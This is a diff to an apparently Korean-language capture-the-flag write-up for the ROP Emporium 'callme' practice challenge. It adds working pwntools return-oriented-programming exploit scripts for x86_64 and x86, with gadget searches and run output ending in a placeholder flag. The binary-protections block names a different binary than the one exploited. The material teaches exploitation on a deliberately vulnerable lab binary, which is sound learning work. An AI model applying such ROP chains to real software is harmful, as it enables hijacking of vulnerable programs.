@@ -99,14 +99,14 @@ context.arch = "amd64"
 
 p = process("./callme")
 
-gadgets = 0x000000000040093c
+gadgets = 0x40093c
 func = [0x400720, 0x400740, 0x4006f0]
 arguments = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]
 
 pay = flat(
-	{40:gadgets}, arguments, func[0],
-	gadgets, arguments, func[1],
-	gadgets, arguments, func[2]
+	{40:gadgets}, arguments, func[0],  # callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+	gadgets, arguments, func[1],       # callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+	gadgets, arguments, func[2]        # callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
 )
 
 p.sendline(pay)
@@ -116,6 +116,71 @@ p.interactive()
 $ python3 test.py
 callme by ROP Emporium
 x86_64
+
+Hope you read the instructions...
+
+> Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+$
+```
+<br />
+<br />
+
+# x86
+
+**Binary Protections:**
+```yaml
+[*] '/home/kali/pico/ret2win32'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+<br />
+<br />
+
+
+```yaml
+$ ROPgadget --binary callme32 | grep "pop"
+...
+0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
+...
+```
+인자가 3개이고, 페이로드 연결 및 스택 정리를 위해 위 가젯을 사용합니다. 나머지는 위 풀이 과정과 동일합니다.
+
+<br />
+
+```python
+from pwn import *
+
+context.log_level = "error"
+context.arch = "x86"
+
+e = ELF("./callme32")
+p = process("./callme32")
+
+pppr = 0x080487f9
+func = [0x80484f0, 0x8048550, 0x80484e0]         # callme_one@plt ~ callme_three@plt
+arguments = [0xdeadbeef, 0xcafebabe, 0xd00df00d]
+
+pay = flat(
+	{44:func[0]}, pppr, arguments, # callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)
+	func[1], pppr, arguments,      # callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d)
+	func[2], pppr, arguments       # callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)
+)
+
+p.sendline(pay)
+p.interactive()
+```
+```bash
+$ python3 test.py
+callme by ROP Emporium
+x86
 
 Hope you read the instructions...
 
